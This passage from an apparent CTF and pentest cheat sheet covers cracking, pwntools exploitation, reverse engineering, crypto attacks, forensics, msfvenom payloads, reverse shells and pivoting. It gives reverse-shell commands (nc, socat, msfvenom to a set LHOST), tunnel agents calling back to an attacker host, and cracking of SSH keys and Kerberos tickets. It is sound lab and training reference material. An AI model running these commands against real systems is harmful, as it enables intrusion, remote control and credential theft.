ssh2john id_rsa > h; john --wordlist=rockyou.txt h
john --format=krb5tgs --wordlist=rockyou.txt kerb.txt
```

## 37. hashid / hash-identifier
- **hashid:** `hashid '<hash>'`; `-m` (show the hashcat mode); `-j` (john format); `-e` (extended).
- **hash-identifier:** interactive. Reference points: 32 hex = MD5(0)/NTLM(1000); 40 = SHA1(100); 64 = SHA256(1400); `$1$`=md5crypt(500); `$2*$`=bcrypt(3200); `$6$`=sha512crypt(1800); `$krb5tgs$`=13100; `$krb5asrep$`=18200.

## 38. cewl / crunch — wordlist generation
- **cewl:** `cewl http://t -w out.txt -d 3 -m 5` (`-d` crawl depth, `-m` min word length, `-w` output, `--with-numbers`, `-e` email).
- **crunch:** `crunch <min> <max> [charset] -t <pattern> -o out.txt`; pattern: `@`=lower, `,`=upper, `%`=digit, `^`=symbol. Example: `crunch 8 8 -t Pass@@%% `.

---

# BINARY EXPLOITATION / PWN

## 39. gdb + pwndbg / GEF
**Install:** `gdb`; pwndbg (`github.com/pwndbg/pwndbg`) or GEF (`hugsy.github.io/gef`).

**Basic GDB:** `b func`/`b *0x401234` (break at address); `r [args]`/`gdb --args ./p a b`; `c` continue; `ni`/`si` (step by instruction over/into); `finish`; `info functions [regex]`; `info registers` (`i r`); `info proc mappings`; `x/20gx $rsp` (20 8-byte words in hex), `x/i $rip` (instruction), `x/s addr` (string); `p (char*)$rdi`; `set $rip=0x...`; `disassemble func`; `watch expr`; `gdb -p PID` (attach).
  - `x/` format: count + format (`x` hex, `d` dec, `i` instr, `s` str) + size (`b`/`h`/`w`/`g` = 1/2/4/8).

**pwndbg (command names use hyphens in newer versions):**
- `cyclic 200` (create a De Bruijn pattern; `-n 4` for 32-bit); `cyclic -l 0x6161616a` (find the **offset** of a value from a crashed register).
- `telescope addr [n]` (recursive pointer dereference); `vmmap` (memory map, `-x`/`-w`); `checksec`; `hexdump addr`; `search -s "str"` / `search -p` / `search --asm`; `nearpc`; `distance a b`; `xinfo addr`.
- `got`/`gotplt`/`plt`; `track-got`; `piebase`; `breakrva`; `aslr`.
- `context` (+ sections `regs`/`disasm`/`code`/`stack`/`backtrace`); `regs`; `retaddr` (return addresses on the stack); `canary`.
- Heap: `heap`; `bins`; `fastbins`/`tcache`/`smallbins`/`unsortedbin`; `malloc-chunk addr`; `top-chunk`; `find-fake-fast addr`; `vis-heap-chunks`; `arena(s)`; `try-free addr`.
- `onegadget`; `rop`/`ropper`; `attachp <pid|name>`.

**GEF:** `pattern create 128` / `pattern search $rsp` (find offset, shows LE/BE); `vmmap`; `checksec`; `dereference addr` (=telescope); `heap chunks`/`heap bins [fast|tcache|...]`; `search-pattern "str"` (alias `grep`); `got`; `xinfo addr`; `registers`; `context`/`ctx`; `elf-info`; `ropper`; `format-string-helper` (breaks on the printf family and checks for writable); `aslr [on|off]`.
```
pwndbg> cyclic 200            # then r, after the crash:
pwndbg> cyclic -l 0x6161616a  # offset to RIP
gef➤ pattern create 200
gef➤ pattern search $rsp
```

## 40. pwntools — Python framework for exploits
**Install:** `pip install pwntools`.
- `from pwn import *`; `context.binary = ELF('./vuln')` (sets arch/bits/endian); `context.log_level='debug'`.
- Connection: `p = process('./vuln')`; `p = remote('host', 1337)`; `p = gdb.debug('./vuln', gdbscript)`.
- Packing: `p64(x)`/`p32(x)` (int→bytes LE), `u64(b)`/`u32(b)` (back); `u64(leak.ljust(8,b'\\x00'))` to pad a 6-byte leak.
- ELF/libc: `elf = ELF('./vuln')`; `elf.symbols['win']`, `elf.got['puts']`, `elf.plt['puts']`, `elf.bss()`; `libc = ELF('./libc.so.6')`; `libc.address = leak - libc.symbols['puts']`; `next(libc.search(b'/bin/sh'))`.
- ROP: `rop = ROP(elf)`; `rop.call('puts', [elf.got['puts']])`; `rop.system(binsh)`; `rop.raw(gadget)`; `payload = rop.chain()`; `print(rop.dump())`.
- I/O: `p.sendline(b'A')`; `p.sendlineafter(b'> ', payload)`; `p.recvuntil(b':')`; `p.recvline()`; `p.interactive()`; `p.clean()`.
- Other: `cyclic(200)` / `cyclic_find(0x6161...)`; `asm('mov rax,1')`; `shellcraft.sh()`; `fmtstr_payload(offset, {addr:value}, write_size='byte')`.
```python
from pwn import *
context.binary = e = ELF('./vuln'); libc = ELF('./libc.so.6')
p = process()
p.sendlineafter(b'>', b'A'*72 + p64(rop_chain))
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.symbols['puts']
p.interactive()
```

## 41. checksec — check binary protections
`checksec --file=./vuln` → RELRO (Partial/Full), Stack Canary, NX, PIE, RPATH/RUNPATH, Fortify. Also available inside pwndbg/gef as `checksec`.

## 42. ROPgadget / ropper — gadget search
- **ROPgadget:** `ROPgadget --binary ./vuln`; `--ropchain` (auto chain); `--only "pop|ret"`; `--string "/bin/sh"`; `--depth N`.
- **ropper:** `ropper -f ./vuln --search "pop rdi"`; `--search "% ?di"`; `--chain execve`; `--string`; `--type rop|jop`.
```bash
ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ropper -f ./vuln --search "pop rdi; ret"
```

## 43. one_gadget — one-shot execve("/bin/sh") in libc
**Install:** `gem install one_gadget`.
`one_gadget ./libc.so.6` → offset addresses and **constraints** (register/stack conditions that must hold). Choose a gadget whose constraints are satisfied at the moment of the jump.

## 44. patchelf — run a binary with the required libc
- `--set-interpreter ./ld-2.31.so ./vuln` (change the dynamic loader); `--replace-needed libc.so.6 ./libc.so.6 ./vuln` (substitute the needed library); `--set-rpath`. Alternative: `LD_PRELOAD=./libc.so.6 ./vuln`.
```bash
patchelf --set-interpreter ./ld.so --replace-needed libc.so.6 ./libc.so.6 ./vuln
```

---

# REVERSE ENGINEERING

## 45. radare2 / rizin — disassembly framework
**Install:** `git clone github.com/radareorg/radare2; sys/install.sh` (rizin - a fork, with close syntax).
- Launch: `r2 -A ./bin` (analysis on load), `-w` (write/patch), `-d` (debug), `-n` (no analysis).
- Analysis: `aaa` (analyze everything; `aa` is faster); `afl` (list of functions, `afl~?` count); `af` (analyze a function); `afn name addr` (rename).
- Navigation: `s addr|sym.main` (seek, `s-` undo); `pdf` (disassemble a function), `pd 20` (20 instructions), `pdb` (basic block); `px` (hexdump); `axt addr` (xref to).
- Info: `ii` (imports), `iz` (strings in data), `izz` (across the whole binary), `iS` (sections), `is` (symbols), `ie` (entrypoint), `ia` (everything).
- Visual modes: `V` (visual), `VV` (function graph), `V!` (panels). Inside the graph: `hjkl` navigation, `t`/`f` true/false branches, `p`/`P` change mode, `q` exit.
- Other: `~` (grep, e.g. `afl~main`), `@` (temporary seek), `wa` (write assembly), `wx` (write hex), `| less`, `> file`.
```
r2 -A ./bin
[0x...]> afl
[0x...]> s main; pdf
[0x...]> iz~flag
```

## 46. ghidra — decompiler (GUI + headless)
**Install:** download from ghidra-sre.org (requires Java).
- GUI: New Project → Import → auto-analysis → double-click a function to decompile (Decompile window), `L` rename, `;` comment.
- Headless (CLI batch processing): `analyzeHeadless <projDir> <projName> -import ./bin -postScript Script.java -scriptPath .`; `-process`, `-deleteProject`, `-readOnly`.
```bash
analyzeHeadless ~/proj P1 -import ./bin -postScript Decompile.java
```

## 47. ltrace / strace — call tracing
- **strace:** system calls. `-f` (forks), `-e trace=open,read,network` (filter), `-p PID` (attach), `-s 200` (string length), `-o out`, `-c` (statistics).
- **ltrace:** library calls. `-f`, `-e 'strcmp+strncmp'`, `-s`, `-p`, `-o`. Useful for peeking at password comparisons (`strcmp`).
```bash
ltrace ./crackme
strace -f -e trace=network ./bin
```

## 48. Decompilers/unpackers
- **jadx** (Android/Java): `jadx -d out app.apk`; `jadx-gui app.apk`; `--deobf`.
- **dnSpy / ilspycmd** (.NET): the dnSpy GUI to view/edit IL/C#; `ilspycmd App.dll > App.cs` (CLI).
- **upx -d** (UPX unpacking): `upx -d packed.bin` (`upx -t` to check).
- **uncompyle6 / decompyle3 / pycdc** (Python .pyc): `uncompyle6 mod.pyc > mod.py`; `pycdc mod.pyc` (for newer Python versions).
- **objdump -d** (disassemble ELF): `objdump -d -M intel ./bin`; `-s` (section contents); `-T` (dynamic symbols).
- **file / strings / nm / readelf:** `file bin` (type); `strings -n 8 bin` / `strings -el bin` (UTF-16LE/wide Windows strings); `nm bin` (symbols); `readelf -h/-S/-d bin` (header/sections/dynamic).
```bash
strings -el dump.bin | grep -i flag
objdump -d -M intel ./bin | less
uncompyle6 app.pyc > app.py
```

---

# CRYPTOGRAPHY

## 49. RsaCtfTool + openssl + xortool + hashpump
**RsaCtfTool** (`git clone RsaCtfTool/RsaCtfTool`): automatic selection of an attack on weak RSA.
- `--publickey key.pub` (key, supports wildcard `"*.pub"`); `--uncipherfile cipher` / `--uncipher <int>` (decrypt); `--private` (output the private key); `--dumpkey --key key` (show n/e/d); `--createpub -n N -e E`; `-n/-p/-q/-e` (parameters manually); `--attack wiener,hastads,fermat,factordb,boneh_durfee,ecm,...,all`; `--ecmdigits N`; `--timeout`. Attacks: Wiener (small d), Hastad (small e), Boneh-Durfee (d<n^0.292), Fermat (close p,q), factordb, common factors, and others.
```bash
RsaCtfTool --publickey key.pub --uncipherfile flag.enc
RsaCtfTool --publickey key.pub --private --attack wiener
RsaCtfTool --dumpkey --key key.pub
```
**openssl:** `openssl rsa -in priv.pem -text -noout` (parse a key); `openssl x509 -in cert -text -noout` (certificate); `openssl enc -aes-256-cbc -d -in c -out p -k pass` (symmetric, `-d` decrypt, `-a` base64); `openssl dgst -sha256 file`; `openssl s_client -connect host:443` (pull the cert).
**xortool:** `xortool file` (find the key length); `-l N` (length), `-c 20` (most frequent byte, e.g. 0x20 for text), `-x` (hex input). Output in `xortool_out/`.
**hashpump / hash_extender:** length-extension attack on MD5/SHA1/SHA256-MAC. hashpump: `-s <known_sig> -d <known_data> -a <append> -k <key_len>` → new data+signature.
```bash
xortool -c 20 cipher.bin
hashpump -s SIG -d "user=guest" -a "&admin=1" -k 16
```
**factordb:** for known n check `factordb.com` (or `--attack factordb` in RsaCtfTool) - often small/public moduli are already factored.

## 50. sage / pycryptodome / CyberChef
- **SageMath:** powerful math for crypto - `factor(n)`, lattices/LLL, discrete log, elliptic curves. Launch: `sage script.sage` or interactively.
- **pycryptodome** (`pip install pycryptodome`): `from Crypto.Util.number import long_to_bytes, inverse, getPrime`; `from Crypto.Cipher import AES`; a fast implementation of RSA/AES/padding in Python.
- **CyberChef** (gchq.github.io/CyberChef): a browser-based "combine" of recipes - Base64/hex/XOR/ROT/Magic detector, handy for quick decoding.

---

# FORENSICS & STEGO

## binwalk — analysis/extraction of embedded files
- `binwalk file` (signatures); `-e`/`--extract` (extract known types); `--dd='png:png'` (carve by type); `-M`/`--matryoshka` (recursively over the extracted); `-B` (signature scan); `-E` (entropy); `-R "\\x..."` (string search); `--run-as=root`.
```bash
binwalk -Me image.png
```
- **foremost** (carving by headers): `foremost -i file -o outdir` (`-t jpg,pdf`). **bulk_extractor:** `bulk_extractor -o out image.dd` (pull out email/URL/cc/PII).

## volatility3 — memory dump analysis
**Install:** `pip install volatility3` (binary `vol`/`vol.py`). Global options go **before** the plugin name: `-f dump.mem`, `-r json|csv|pretty`, `-o outdir`. In vol3 a profile is not needed (symbols are downloaded automatically).
- Windows: `windows.info` (OS/architecture), `windows.pslist`/`windows.psscan`/`windows.pstree` (processes; psscan finds hidden ones), `windows.cmdline`, `windows.netscan`/`windows.netstat` (network), `windows.hashdump.Hashdump` (SAM hashes), `windows.lsadump`/`windows.cachedump`, `windows.filescan` + `windows.dumpfiles --virtaddr 0x...`, `windows.malfind` (injections), `windows.registry.hivelist`/`printkey`.
- Linux: `linux.pslist`/`linux.psscan`/`linux.pstree`/`linux.psaux`, `linux.bash` (bash history), `linux.netstat`, `linux.check_syscall`, `linux.elfs`, `linux.find_file`.
- **volatility2** (legacy): different syntax - `--profile=Win7SP1x64` is mandatory, plugins without a prefix (`pslist`, `hashdump -f`, `imageinfo` to determine the profile).
```bash
vol -f mem.dmp windows.info
vol -f mem.dmp windows.pstree
vol -f mem.dmp -r csv windows.netscan | grep ESTABLISHED
vol -f mem.dmp windows.hashdump.Hashdump
strings -el mem.dmp | grep -i "flag{"      # quick check
```

## wireshark / tshark / tcpdump — traffic analysis
- **tshark:** `-r cap.pcap` (read); `-Y 'http.request'` (display filter); `-z follow,tcp,ascii,0` (follow stream); `--export-objects http,outdir`; `-T fields -e ip.src -e http.host`; `-c N`; `-w out.pcap`.
- **tcpdump:** `-i eth0`; `-r`/`-w file`; `-n` (no DNS); `-A` (ASCII), `-X` (hex+ASCII); `-s 0` (full packet); BPF filter `'tcp port 80'`.
```bash
tshark -r c.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
tshark -r c.pcap --export-objects http,loot
```

## exiftool / steghide / stegseek / zsteg / outguess / zbarimg / PDF / olevba
- **exiftool file** - metadata (often a flag/hint in Comment/Author). `-all`, `-Comment`.
- **steghide:** `steghide info file.jpg` (is there an embedded payload); `steghide extract -sf file.jpg [-p pass]` (extract; empty password - just Enter); `embed -cf cover -ef secret`. Supports JPEG/BMP/WAV/AU.
- **stegseek** (fast steghide brute): `stegseek file.jpg rockyou.txt` (runs rockyou in seconds); `--seed`.
- **zsteg** (PNG/BMP LSB): `zsteg -a file.png` (all methods); `zsteg -E "b1,rgb,lsb,xy" file.png` (extract by a specific payload).
- **outguess:** `outguess -r stego.jpg out.txt` (extract), `-k pass`.
- **zbarimg** (QR/barcodes): `zbarimg qr.png`.
- **PDF:** `pdfinfo file.pdf`; `pdf-parser.py file.pdf` (objects/streams, `--object N`, `--filter`); `pdftotext`.
- **oletools:** `olevba doc.docm` (extract/deobfuscate VBA macros); `oleid`, `oledump.py`.
```bash
steghide extract -sf img.jpg -p ''
stegseek img.jpg /usr/share/wordlists/rockyou.txt
zsteg -a img.png
exiftool img.jpg
olevba suspicious.docm
```

---

# EXPLOIT / РЕСУРСЫ / PIVOTING

## searchsploit — offline ExploitDB
- `searchsploit apache 2.4` (search); `-m <id>`/`--mirror` (copy the exploit to the current folder); `-x <id>`/`--examine` (show); `-p` (full path); `-u`/`--update`; `-w` (links); `--nmap scan.xml` (based on nmap results); `-t` (search by title).
```bash
searchsploit -m 12345
searchsploit --nmap nmap.xml
```

## msfvenom — payload generation
- `-p payload` (e.g. `windows/x64/meterpreter/reverse_tcp`, `linux/x64/shell_reverse_tcp`, `php/meterpreter/reverse_tcp`, `java/jsp_shell_reverse_tcp`); `LHOST=` / `LPORT=` (for reverse) / `RHOST=`; `-f exe|elf|raw|psh|war|asp|macho|dll|py|c` (format); `-e x86/shikata_ga_nai` (encoder); `-i N` (encoding iterations); `-b '\\x00\\x0a\\x0d'` (bad bytes); `-a x86|x64` + `--platform`; `-o file` (output); `-n N` (nopsled); `-s N` (max size); `--list payloads|encoders`; `-x template.exe -k` (inject into a template).
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o s.elf
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=443 -f raw -o s.php
msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -b '\x00\x0a' -e x86/shikata_ga_nai -f c
```

## metasploit (msfconsole) — basics
`msfconsole -q`; `search type:exploit name`; `use <module>`; `show options`; `set RHOSTS/LHOST/LPORT`; `set payload ...`; `run`/`exploit` (`-j` in the background); handler: `use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ...; set ExitOnSession false; exploit -j`. In meterpreter: `sysinfo`, `getuid`, `hashdump`, `shell`, `download`/`upload`, `portfwd`.

## Reverse shell helpers and stabilization
- **nc:** listener `nc -lvnp 443`; connect `nc IP 443 -e /bin/bash` (or the mkfifo variant).
- **socat** (more stable, TTY): listener `socat file:`tty`,raw,echo=0 tcp-listen:443`; victim `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:443`.
- **pwncat-cs:** `pwncat-cs -lp 443` (an advanced listener with auto-stabilization, persistence, file upload/download).
- **Shell stabilization:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm` (a full TTY with autocompletion/Ctrl+C).

## Pivoting / tunneling
- **chisel** (HTTP tunnel + SOCKS): server on the attacker `./chisel server -p 8000 --reverse`; client on the target `./chisel client ATTACKER:8000 R:socks` (reverse SOCKS5). Direct port forward: `R:88:127.0.0.1:88`. Then `proxychains <tool>`.
- **ligolo-ng** (L3 via TUN, no proxychains): on the attacker `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert`; agent on the target `./agent -connect ATTACKER:11601 -ignore-cert`; in the console `session` → select → `start`; then `sudo ip route add <subnet>/24 dev ligolo`. Forward a reverse-shell: `listener_add --addr 0.0.0.0:4443 --to 0.0.0.0:1234`.
- **sshuttle** ("poor man's VPN" over SSH): `sshuttle -r user@pivot 10.1.1.0/24` (`-x` exclude a network, `-e 'ssh -i key'`). Does not require root on the pivot.
- **proxychains** (config `/etc/proxychains4.conf`): at the end of the `[ProxyList]` section add `socks5 127.0.0.1 1080`; `socks4`/`socks5` and the `quiet_mode` option are recommended; use as `proxychains4 -q nmap -sT -Pn <target>`. ICMP/ping does not pass through SOCKS (TCP only).
```bash
# chisel reverse SOCKS
./chisel server -p 8000 --reverse           # attacker
./chisel client 10.10.14.1:8000 R:socks     # target
proxychains4 -q nxc smb 172.16.1.0/24
```

---

# Recommendations (стадии работы и пороги переключения)

1. **Recon (web/HTB):** start with `nmap -sC -sV` + a full `-p- --min-rate 5000`; on the found HTTP - `feroxbuster`/`ffuf` + `nuclei -as`. Threshold: found a non-standard service/CMS → move to a specialized tool (`wpscan`, `sqlmap`, `dalfox`).
2. **Getting a foothold:** if there is a form/parameter - `sqlmap`/`ghauri` (SQLi), `dalfox` (XSS), `commix`/`SSTImap` (RCE). When creds are found - immediately check for reuse via `netexec` over SMB/WinRM/SSH.
3. **AD:** `kerbrute userenum` (no lockout) → `netexec --pass-pol` (learn the lockout threshold) before spraying → `impacket-GetNPUsers`/`GetUserSPNs` to escalate → `bloodhound-python -c All` for paths → `certipy find -vulnerable` if AD CS is present. Threshold: got a hash → crack with `hashcat -m 13100/18200/5600/1000`.
4. **PrivEsc:** `linpeas`/`winpeas` + `pspy` → check the findings (`sudo -l`, SUID, capabilities) on GTFOBins/LOLBAS; kernel/patches - exploit-suggester. Change the vector if EDR/patches close off the LOLBin.
5. **Pwn/RE/Crypto/Forensics:** for pwn - `checksec` → choice of technique (canary/NX/PIE decide whether a leak/ROP is needed) → `pwntools` + `gdb/pwndbg`. For crypto - `RsaCtfTool --attack all`, on failure manual analysis in Sage. For forensics - first `strings`/`binwalk`/`exiftool`, then domain-specific `volatility3`/`stegseek`/`zsteg`.
6. **Pivoting:** when you have access to a second network - `chisel`/`ligolo-ng`; ligolo is preferable for scanning (L3, no proxychains), chisel - for a quick reverse-SOCKS.

# Caveats
- Versions change flags: `crackmapexec` was renamed to `netexec` (`nxc`); pwndbg switched underscores to hyphens in command names (`find-fake-fast`, `vis-heap-chunks`); the list of `RsaCtfTool` attacks depends on the version. Always check against `--help`/`-h`.
- hashcat `-m` numbers and volatility3 plugins evolve (hashcat v7.x added Argon2 = 34000; vol3 replaces some legacy plugins); look up the plugin list via `vol -f dump.mem windows` (prints the available ones) or `<plugin> -h`.
- `passwordspray`/`bruteuser` (kerbrute) and hydra brute increment badPwd and can lock out accounts - even in a lab account for the pass-policy.
- The pwndbg command `propagate` is not found in the current documentation (probably renamed/removed); use `set emulate on` for automatic resolution of values in the context.
- This is material for authorized CTF/HTB/pentest labs; using it against systems you do not own without permission is illegal.
